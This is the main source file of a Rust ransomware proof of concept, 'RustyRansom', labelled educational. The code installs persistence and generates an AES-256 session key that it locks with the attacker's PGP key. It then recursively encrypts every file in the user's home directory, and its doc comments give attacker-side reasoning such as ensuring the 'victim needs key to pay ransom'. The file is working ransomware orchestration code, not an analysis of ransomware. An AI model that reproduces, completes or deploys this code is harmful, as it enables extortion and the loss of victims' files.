//! # RustyRansom - Proof of Concept Ransomware
//!
//! Educational ransomware PoC demonstrating hybrid cryptography, cross-platform
//! persistence, and secure key management in Rust.
//!
//! ## Architecture
//!
//! - **Encryption**: AES-256-GCM streaming encryption with per-file nonces
//! - **Key Recovery**: OpenPGP-protected session key (only attacker can decrypt)
//!   - Supports RSA and elliptic curve keys (Ed25519, Cv25519)
//!   - Uses `sequoia-openpgp` for modern OpenPGP implementation
//! - **Persistence**: OS-specific mechanisms (systemd on Linux, Registry on Windows)
//! - **Self-Protection**: Extension blacklist and self-executable detection
//!
//! ## Execution Flow
//!
//! 1. Install OS-specific persistence mechanism
//! 2. Generate random AES-256 session key
//! 3. Protect session key with embedded PGP public key
//! 4. Recursively encrypt all files in home directory
//! 5. Zeroize session key from memory
//!
//! ## Security Features
//!
//! - **Memory Safety**: Session key zeroized after use (prevents cold-boot attacks)
//! - **Self-Protection**: Ransomware binary never encrypted (blacklist + path detection)
//! - **Forward Secrecy**: New session key per execution
//! - **No Privilege Escalation**: Operates with user-level permissions only
//!
//! ## Disclaimer
//!
//! **FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY.**

mod encryption;
mod persistence;
mod recovery;

use std::{
    fs::{read_dir, File},
    io::Write,
};

use aes_gcm::{aead::OsRng, Aes256Gcm, KeyInit};
use dirs2::{data_dir, home_dir};
use encryption::encrypt_files;
use persistence::install_persistence;
use rayon::prelude::*;
use recovery::save_key;
use zeroize::Zeroize;

/// Counts the number of existing recovery key files in the data directory.
///
/// This function enables multi-session recovery key management by counting
/// existing `recovery_file_*.key` files. The count is used to generate the
/// next sequential key index (e.g., if 2 keys exist, the next will be `recovery_file_2.key`).
///
/// # Multi-Session Architecture
///
/// Each ransomware execution creates a new recovery file with a unique index:
/// - Session 0: `recovery_file_0.key`
/// - Session 1: `recovery_file_1.key`
/// - Session 2: `recovery_file_2.key`
/// - ...and so on
///
/// Encrypted files are tagged with the corresponding key index in their filename
/// (e.g., `document_0.txt.ciro`, `photo_1.jpg.ciro`), allowing precise mapping
/// of which recovery key decrypts which files.
///
/// # Parallelization
///
/// Uses Rayon's `par_bridge()` for parallel directory traversal to maximize
/// performance when counting many files (though typically only a few recovery
/// keys exist in practice).
///
/// # Returns
///
/// * `usize` - The number of existing recovery key files (0 if none found)
///
/// # Panics
///
/// - Cannot resolve system data directory (`data_dir()` returns None)
/// - Cannot read data directory (permission denied, doesn't exist)
///
/// # Examples
///
/// ```ignore
/// let key_count = count_keys(); // Returns 0 if no keys exist
/// // Create new recovery file: recovery_file_0.key
///
/// let key_count = count_keys(); // Returns 1 after first key created
/// // Create new recovery file: recovery_file_1.key
/// ```
fn count_keys() -> usize {
    let data_dir_path = data_dir().expect("[!] Failed to get data dir path");
    let entries = read_dir(&data_dir_path).expect("[!] Failed to open data dir");

    entries
        .par_bridge()
        .filter_map(|entry| entry.ok())
        .filter(|entry| {
            entry
                .file_name()
                .to_string_lossy()
                .starts_with("recovery_file")
        })
        .count()
}

/// Ransomware entry point - orchestrates persistence, key management, and encryption.
///
/// This function coordinates the complete ransomware operation:
/// 1. **Persistence**: Install system-level auto-start mechanism
/// 2. **Key Generation**: Create random AES-256 session key
/// 3. **Key Protection**: Encrypt session key with attacker's OpenPGP public key (RSA or elliptic curve)
/// 4. **File Encryption**: Recursively encrypt all files in home directory
/// 5. **Memory Cleanup**: Zeroize session key from RAM
///
/// # Error Handling
///
/// - **Persistence Failure**: Logged but non-fatal (encryption continues)
/// - **Key Save Failure**: Fatal error (panics with error message)
/// - **Encryption Errors**: Handled per-file in `encrypt_files()` (resilient)
///
/// # Panics
///
/// - Cannot resolve data directory
/// - Cannot resolve home directory (`$HOME` / `%USERPROFILE%` missing)
/// - Failed to save recovery key file (critical - victim needs key to pay ransom)
/// - Failed to save marker file
///
/// # Execution Order Rationale
///
/// - **Persistence first**: Ensures ransomware survives even if process is killed mid-encryption
/// - **Key save before encryption**: Guarantees recovery file exists before any files encrypted
/// - **Zeroize last**: Ensures key not leaked in memory dumps/swap after encryption complete
fn main() {
    let data_path = data_dir().expect("[!] Failed to open data directory");
    let marker_path = data_path.join("marker");

    if !marker_path.exists() {
        let dir = home_dir().expect("[!] Failed to open home directory");

        // Install persistence - logs error but continues if it fails
        if let Err(e) = install_persistence() {
            println!("[!] Persistence installation failed: {e}");
        }

        // Generate cryptographically secure random AES-256 key (32 bytes)
        let mut key = Aes256Gcm::generate_key(OsRng);
        let cipher = Aes256Gcm::new(&key);

        let key_count = count_keys();

        // Save OpenPGP-encrypted recovery key - must succeed before encryption starts
        save_key(key.to_vec(), key_count).expect("[!] Failed to save the recovery key");

        // Recursively encrypt all files in home directory
        encrypt_files(dir, cipher, key_count);

        // Zeroize session key from memory (prevents recovery from RAM dumps)
        key.zeroize();

        // Create a file to mark that encryption has completed
        let mut marker_file = File::create(marker_path).expect("[!] Failed to create marker file");
        marker_file
            .write_all(String::from("Encryption completed").as_bytes())
            .expect("[!] Failed to write message inside marker file");
    }
}
